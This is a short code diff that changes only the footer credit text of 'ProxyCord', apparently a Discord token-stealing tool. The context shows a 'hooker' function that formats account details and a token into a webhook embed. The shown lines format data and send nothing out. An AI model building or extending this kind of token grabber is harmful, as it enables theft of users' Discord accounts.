@@ -156,7 +156,7 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "ProxyCord - made by saeed0x1",
+        "text": "ProxyCord -created by saeed0x1",
         "icon_url": "https://avatars.githubusercontent.com/u/73954987?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
